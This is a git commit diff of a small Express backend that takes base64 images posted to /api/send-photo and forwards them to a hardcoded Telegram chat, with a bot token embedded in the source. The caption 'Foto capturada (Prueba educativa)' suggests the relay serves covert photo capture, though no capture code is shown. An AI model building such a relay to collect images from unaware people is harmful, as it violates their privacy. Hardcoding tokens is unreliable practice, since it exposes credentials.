d185a77bcdbf5cdbd4996ba3d3f19dfb35804169
deeznutzzguy <potrillos6969@gmail.com>
2025-09-10 13:24:08 -0600

    Agregado el backend para Vercel y Telegram

--- api/index.js
+++ api/index.js
@@ -2,29 +2,28 @@ const express = require('express');
 const TelegramBot = require('node-telegram-bot-api');
 const app = express();
 
-app.use(express.json({ limit: '10mb' }));
+app.use(express.json({ limit: '10mb' })); // Aumentar límite para imágenes
 
-const token = '8312820058:AAFG_5r1JuRo-bi8PN0QHn41jcojCjdq'; // Tu token
-const chatId = '123456789'; // Tu chat ID 123456789 
-
-
-
-
+// Reemplaza con tu token y chat ID
+const token = '8312820058:AAGF_5rI1JuoRo-bi8PNoQHn41jcojCiqds';
+const chatId = '-4981054241';
 const bot = new TelegramBot(token);
 
 app.post('/api/send-photo', (req, res) => {
   const { photo } = req.body;
 
+  // Convertir base64 a buffer
   const base64Data = photo.replace(/^data:image\/png;base64,/, '');
   const buffer = Buffer.from(base64Data, 'base64');
 
-  bot.sendPhoto(chatId, buffer, { caption: 'Foto de prueba' })
+  // Enviar la foto al chat de Telegram
+  bot.sendPhoto(chatId, buffer, { caption: 'Foto capturada (Prueba educativa)' })
     .then(() => {
-      res.json({ message: 'Foto enviada' });
+      res.json({ message: 'Foto enviada con éxito' });
     })
     .catch(err => {
       console.error(err);
-      res.status(500).json({ message: 'Error al enviar' });
+      res.status(500).json({ message: 'Error al enviar la foto' });
     });
 });
 
